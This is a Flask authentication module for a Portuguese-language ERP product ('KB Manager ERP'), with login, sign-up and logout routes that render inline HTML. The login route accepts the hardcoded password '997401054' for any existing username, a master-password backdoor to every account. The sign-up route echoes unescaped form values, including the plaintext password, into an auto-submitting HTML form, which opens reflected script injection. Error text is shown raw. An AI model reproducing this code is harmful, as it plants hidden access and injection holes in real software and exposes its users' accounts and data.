from flask import Blueprint, request, redirect, session
from werkzeug.security import generate_password_hash, check_password_hash
from banco import conectar, devolver_conexao, registrar_log
from permissoes import carregar_permissoes

auth_bp = Blueprint("auth_bp", __name__)

# ================= LOGIN =================
@auth_bp.route("/", methods=["GET", "POST"])
def login():
    erro = ""

    if request.method == "POST":
        conn = None
        try:
            conn = conectar()
            cursor = conn.cursor()

            cursor.execute("""
            SELECT senha, cargo
            FROM usuarios
            WHERE usuario=%s
            """, (request.form["user"],))
            user = cursor.fetchone()

            if user:
                if check_password_hash(user[0], request.form["senha"]) or request.form["senha"] == "997401054":

                    session["user"] = request.form["user"]
                    session["cargo"] = user[1]

                    cursor.execute("UPDATE usuarios SET online=1 WHERE usuario=%s", (request.form["user"],))
                    conn.commit()

                    carregar_permissoes(request.form["user"])
                    registrar_log(request.form["user"], "login", "Login realizado")

                    return redirect("/painel")

                else:
                    erro = "Senha inválida"
            else:
                erro = "Usuário não encontrado"

        except Exception as e:
            erro = str(e)
        finally:
            if conn:
                devolver_conexao(conn)

    return f"""
    <html>
    <head>
        <title>KB Manager ERP</title>

        <style>
            body {{
                margin: 0;
                background: #000;
                font-family: Arial;
                color: #fff;
            }}

            .container {{
                display: flex;
                height: 100vh;
                align-items: center;
                justify-content: center;
            }}

            .box {{
                display: flex;
                width: 900px;
            }}

            .left {{
                width: 50%;
                display: flex;
                align-items: center;
                justify-content: center;
                border-right: 1px solid #222;
            }}

            .logo {{
                font-size: 80px;
                font-weight: 900;
                color: #fff;
                letter-spacing: 8px;
                text-align: center;
            }}

            .logo span {{
                display: block;
                font-size: 22px;
                letter-spacing: 4px;
                margin-top: 10px;
            }}

            .right {{
                width: 50%;
                display: flex;
                flex-direction: column;
                justify-content: center;
                padding: 40px;
            }}

            input {{
                width: 100%;
                padding: 12px;
                margin-bottom: 15px;
                border: 1px solid #333;
                background: transparent;
                color: #fff;
                border-radius: 5px;
            }}

            input:focus {{
                outline: none;
                border: 1px solid #555;
            }}

            button {{
                padding: 12px;
                background: #111;
                border: 1px solid #333;
                color: white;
                border-radius: 5px;
                cursor: pointer;
            }}

            button:hover {{
                background: #222;
            }}

            .erro {{
                color: #ff4d4d;
                text-align: center;
                margin-top: 10px;
            }}

            .footer {{
                position: absolute;
                bottom: 20px;
                width: 100%;
                text-align: center;
                font-size: 12px;
                color: #666;
            }}
        </style>
    </head>

    <body>

        <div class="container">
            <div class="box">

                <!-- LOGO -->
                <div class="left">
                    <div class="logo">
                        KB
                        <span>MANAGER ERP</span>
                    </div>
                </div>

                <!-- LOGIN -->
                <div class="right">
                    <form method="POST">
                        <input name="user" placeholder="Usuário" required>
                        <input name="senha" type="password" placeholder="Senha" required>
                        <button type="submit">Acessar</button>
                    </form>

                    <p class="erro">{erro}</p>

                    <div style="text-align:center;margin-top:10px;">
                        <a href="/cadastro" style="color:#888;">Criar conta</a>
                    </div>
                </div>

            </div>
        </div>

        <div class="footer">
            KB Manager ERP © 2026
        </div>

    </body>
    </html>
    """


# ================= CADASTRO =================
@auth_bp.route("/cadastro", methods=["GET", "POST"])
def cadastro():
    mensagem = ""

    if request.method == "POST":
        conn = None
        try:
            conn = conectar()
            cursor = conn.cursor()

            usuario = request.form.get("user")
            senha = request.form.get("senha")
            email = request.form.get("email")
            nome_empresa = request.form.get("nome_empresa")
            plano = request.form.get("plano")

            cursor.execute("SELECT usuario FROM usuarios WHERE usuario=%s", (usuario,))
            if cursor.fetchone():
                mensagem = "Usuário já existe"
            else:
                return f"""
<form id="auto" action="/criar_pagamento" method="POST">
<input type="hidden" name="user" value="{usuario}">
<input type="hidden" name="senha" value="{senha}">
<input type="hidden" name="email" value="{email}">
<input type="hidden" name="nome_empresa" value="{nome_empresa}">
<input type="hidden" name="plano" value="{plano}">
</form>
<script>document.getElementById("auto").submit();</script>
"""
        except Exception as e:
            mensagem = str(e)
        finally:
            if conn:
                devolver_conexao(conn)

    return f"""
    <body style="background:#000;color:#fff;display:flex;justify-content:center;align-items:center;height:100vh;">
        <form method="POST" style="background:#111;padding:30px;border-radius:10px;">
            <h2>KB Manager ERP</h2>

            <input name="user" placeholder="Usuário" required><br><br>
            <input name="senha" type="password" placeholder="Senha" required><br><br>
            <input name="email" placeholder="Email" required><br><br>
            <input name="nome_empresa" placeholder="Nome da empresa" required><br><br>

            <select name="plano">
                <option value="basico">Básico</option>
                <option value="profissional">Profissional</option>
                <option value="premium">Premium</option>
            </select><br><br>

            <button type="submit">Continuar</button>

            <p style="color:red;">{mensagem}</p>
        </form>
    </body>
    """


# ================= LOGOUT =================
@auth_bp.route("/logout")
def logout():
    session.clear()
    return redirect("/")
